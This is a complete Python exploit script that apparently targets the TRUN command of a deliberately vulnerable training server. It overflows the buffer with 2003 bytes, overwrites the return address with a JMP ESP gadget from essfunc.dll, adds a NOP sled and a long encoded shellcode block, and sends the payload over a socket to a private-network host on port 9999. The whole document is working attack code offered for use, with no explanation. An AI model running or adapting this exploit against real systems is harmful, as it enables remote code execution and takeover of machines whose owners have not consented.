#!/usr/bin/python

import sys, socket

buff = b"TRUN /.:/"
buff += b"A" * 2003
buff += b"\xaf\x11\x50\x62" # JMP ESP in essfunc.dll
buff += b"\x90" * 10

#### shellcode ###

buff += b"\xd9\xc5\xd9\x74\x24\xf4\x5d\xb8\xb7\x17\x62\x5d\x29"
buff += b"\xc9\xb1\x52\x31\x45\x17\x03\x45\x17\x83\x5a\xeb\x80"
buff += b"\xa8\x58\xfc\xc7\x53\xa0\xfd\xa7\xda\x45\xcc\xe7\xb9"
buff += b"\x0e\x7f\xd8\xca\x42\x8c\x93\x9f\x76\x07\xd1\x37\x79"
buff += b"\xa0\x5c\x6e\xb4\x31\xcc\x52\xd7\xb1\x0f\x87\x37\x8b"
buff += b"\xdf\xda\x36\xcc\x02\x16\x6a\x85\x49\x85\x9a\xa2\x04"
buff += b"\x16\x11\xf8\x89\x1e\xc6\x49\xab\x0f\x59\xc1\xf2\x8f"
buff += b"\x58\x06\x8f\x99\x42\x4b\xaa\x50\xf9\xbf\x40\x63\x2b"
buff += b"\x8e\xa9\xc8\x12\x3e\x58\x10\x53\xf9\x83\x67\xad\xf9"
buff += b"\x3e\x70\x6a\x83\xe4\xf5\x68\x23\x6e\xad\x54\xd5\xa3"
buff += b"\x28\x1f\xd9\x08\x3e\x47\xfe\x8f\x93\xfc\xfa\x04\x12"
buff += b"\xd2\x8a\x5f\x31\xf6\xd7\x04\x58\xaf\xbd\xeb\x65\xaf"
buff += b"\x1d\x53\xc0\xa4\xb0\x80\x79\xe7\xdc\x65\xb0\x17\x1d"
buff += b"\xe2\xc3\x64\x2f\xad\x7f\xe2\x03\x26\xa6\xf5\x64\x1d"
buff += b"\x1e\x69\x9b\x9e\x5f\xa0\x58\xca\x0f\xda\x49\x73\xc4"
buff += b"\x1a\x75\xa6\x4b\x4a\xd9\x19\x2c\x3a\x99\xc9\xc4\x50"
buff += b"\x16\x35\xf4\x5b\xfc\x5e\x9f\xa6\x97\xa0\xc8\x90\x65"
buff += b"\x49\x0b\xe0\x4a\xa0\x82\x06\xe6\xa2\xc2\x91\x9f\x5b"
buff += b"\x4f\x69\x01\xa3\x45\x14\x01\x2f\x6a\xe9\xcc\xd8\x07"
buff += b"\xf9\xb9\x28\x52\xa3\x6c\x36\x48\xcb\xf3\xa5\x17\x0b"
buff += b"\x7d\xd6\x8f\x5c\x2a\x28\xc6\x08\xc6\x13\x70\x2e\x1b"
buff += b"\xc5\xbb\xea\xc0\x36\x45\xf3\x85\x03\x61\xe3\x53\x8b"
buff += b"\x2d\x57\x0c\xda\xfb\x01\xea\xb4\x4d\xfb\xa4\x6b\x04"
buff += b"\x6b\x30\x40\x97\xed\x3d\x8d\x61\x11\x8f\x78\x34\x2e"
buff += b"\x20\xed\xb0\x57\x5c\x8d\x3f\x82\xe4\xad\xdd\x06\x11"
buff += b"\x46\x78\xc3\x98\x0b\x7b\x3e\xde\x35\xf8\xca\x9f\xc1"
buff += b"\xe0\xbf\x9a\x8e\xa6\x2c\xd7\x9f\x42\x52\x44\x9f\x46"

#### send buffer to server ####

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.56.3', 9999))

s.send((buff))
s.close()